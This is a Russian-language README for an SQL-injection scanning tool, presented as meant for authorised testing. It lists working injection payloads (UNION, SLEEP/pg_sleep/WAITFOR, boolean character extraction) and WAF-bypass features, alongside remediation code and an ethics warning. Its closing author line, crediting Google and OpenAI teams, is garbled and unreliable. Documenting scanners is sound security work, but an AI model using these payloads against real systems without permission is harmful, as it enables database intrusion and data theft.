# SQL Injection Auditor (CASCADE SWE-1.5)

Модуль автоматизации аудита SQL-инъекций для проведения санкционированного тестирования безопасности веб-приложений.

## Возможности

### 🕷️ Crawler & Parser
- Автоматическое обнаружение всех входных векторов (URL-параметры, GET/POST, заголовки, Cookies)
- Умный анализ веб-страниц для извлечения форм и параметров
- Поддержка обхода robots.txt и настройка задержек

### 💣 Payload Engine
- Генерация проверочных нагрузок для различных типов инъекций:
  - **Error-based**: `' OR 1=1 --`, использование UNION, подбор колонок
  - **Boolean-based**: `' AND 1=1 --`, `' AND 1=2 --`
  - **Time-based**: `' AND SLEEP(5) --`, `WAITFOR DELAY`
  - **Union-based**: `' UNION SELECT 1,2,3 --`
- Поддержка СУБД: MySQL, PostgreSQL, MSSQL, Oracle, SQLite
- Оптимизация порядка тестирования нагрузок

### 🔍 Analysis Engine
- Детектирование паттернов ошибок SQL:
  - `Unknown column`, `Syntax error`, `mysql_fetch_array`
  - `pg_query()`, `Microsoft OLE DB Provider`, `ORA-xxxxx`
- Извлечение системной информации (версия БД, имя пользователя)
- Анализ ответов для определения типа инъекции

### ✅ Verification Module
- Многоступенчатая проверка для исключения ложноположительных срабатываний
- Тестирование консистентности поведения
- Повторная верификация найденных уязвимостей

### 🛡️ WAF Bypass
- Обход Web Application Firewall:
  - URL-кодирование variations
  - Case variations
  - Comment-based obfuscation
  - Whitespace variations
  - Encoding techniques
- Автоматическое определение типа WAF
- Адаптивная стратегия обхода

### 📊 Reporting
- Генерация отчетов в форматах JSON и PDF
- Классификация уязвимостей по уровню риска
- Рекомендации по устранению
- Технические детали и доказательства

## Установка

```bash
# Клонирование репозитория
git clone <repository-url>
cd sql_injection_auditor

# Установка зависимостей
pip install -r requirements.txt

# Для PDF отчетов (опционально)
pip install reportlab
```

## Использование

### Базовое сканирование

```bash
# Активное сканирование с обходом сайта
python main.py -u http://example.com

# Пассивное сканирование только указанного URL
python main.py -u http://example.com --mode passive
```

### Расширенные опции

```bash
# Указание конкретных СУБД
python main.py -u http://example.com --databases mysql postgresql

# Настройка глубины обхода
python main.py -u http://example.com --depth 5

# Использование прокси
python main.py -u http://example.com --proxy http://127.0.0.1:8080

# Генерация PDF отчета
python main.py -u http://example.com --pdf

# Использование конфигурационного файла
python main.py -u http://example.com --config config.json
```

### Конфигурационный файл

Создайте `config.json` для настройки параметров:

```json
{
  "crawl_delay": 1.0,
  "crawl_depth": 3,
  "timeout": 30,
  "user_agent": "SQLiAuditor/1.0",
  "database_types": ["mysql", "postgresql", "mssql"],
  "verify_vulnerabilities": true,
  "enable_waf_bypass": true,
  "output_dir": "reports",
  "report_formats": ["json"],
  "generate_pdf": false,
  "payload_strategy": "effectiveness"
}
```

## Сценарии тестирования

### Обнаружение Error-based инъекций

```python
# 1. Подача символа ' в параметр
payload = "'"

# 2. Получение ошибки синтаксиса
# Ожидаемый ответ: "You have an error in your SQL syntax"

# 3. Идентификация с помощью ' OR 1=1 --
payload = "' OR 1=1 -- "

# 4. Эксплуатация через ORDER BY для определения колонок
payload = "' ORDER BY 5 -- "
payload = "' UNION SELECT 1,2,3,4,5 -- "
```

### Time-based атаки

```python
# MySQL
payload = "' AND SLEEP(5) -- "

# PostgreSQL  
payload = "' AND pg_sleep(5) -- "

# MSSQL
payload = "'; WAITFOR DELAY '00:00:05' -- "
```

### Boolean-based атаки

```python
# Истинное условие
payload = "' AND 1=1 -- "

# Ложное условие  
payload = "' AND 1=2 -- "

# Подбор символов
payload = "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))=97 -- "
```

## Структура проекта

```
sql_injection_auditor/
├── main.py                 # Основное приложение
├── modules/                # Модули системы
│   ├── crawler.py         # Crawler & Parser
│   ├── payload_engine.py  # Payload Engine
│   ├── analysis_engine.py # Analysis Engine
│   ├── verification.py    # Verification Module
│   ├── waf_bypass.py      # WAF Bypass
│   └── reporting.py       # Reporting
├── tests/                  # Тесты
├── reports/               # Генерируемые отчеты
├── requirements.txt       # Зависимости Python
└── README.md             # Документация
```

## Типы отчетов

### JSON отчет

```json
{
  "scan_summary": {
    "target_url": "http://example.com",
    "vulnerabilities_found": 3,
    "high_risk_vulnerabilities": 1
  },
  "vulnerabilities": [
    {
      "url": "http://example.com/user.php",
      "parameter": "id",
      "injection_type": "error_based",
      "database_type": "mysql",
      "payload": "' OR 1=1 -- ",
      "risk_level": "HIGH",
      "confidence": 0.95
    }
  ],
  "recommendations": [
    {
      "title": "Implement Parameterized Queries",
      "description": "Replace dynamic SQL with prepared statements"
    }
  ]
}
```

### PDF отчет

PDF отчет включает:
- Исполнительную сводку
- Детальную информацию об уязвимостях
- Результаты верификации
- Рекомендации по устранению
- Технические детали

## Рекомендации по устранению

### 1. Parameterized Queries

**PHP:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

**Python:**
```python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

**Java:**
```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
```

### 2. Input Validation

- Валидация формата и длины входных данных
- Использование whitelist подхода
- Отклонение подозрительных паттернов

### 3. Database Security

- Использование аккаунтов с минимальными привилегиями
- Регулярное обновление СУБД
- Включение аудита и логирования

## Безопасность и этика

⚠️ **ВАЖНО**: Этот инструмент предназначен только для санкционированного тестирования безопасности.

- Используйте только на системах, где у вас есть разрешение
- Соблюдайте законодательство о кибербезопасности
- Не используйте для вредоносных целей
- Проверяйте найденные уязвимости в изолированной среде

## Требования

- Python 3.7+
- requests >= 2.31.0
- beautifulsoup4 >= 4.12.0
- lxml >= 4.9.0
- reportlab >= 4.0.0 (для PDF отчетов)

## Лицензия

Этот проект разработан в рамках CASCADE SWE-1.5 для образовательных и исследовательских целей.

## Поддержка

При возникновении проблем или вопросов:
1. Проверьте лог файл `sql_injection_auditor.log`
2. Убедитесь, что все зависимости установлены
3. Проверьте сетевое подключение и настройки прокси

---

**Версия**: 1.0  

**Автор**: CASCADE SWE-1.5 Team AND GOOGLE AI Team AND OPENAI Team AN WE RAZDOR

**Дата**: Май 2026
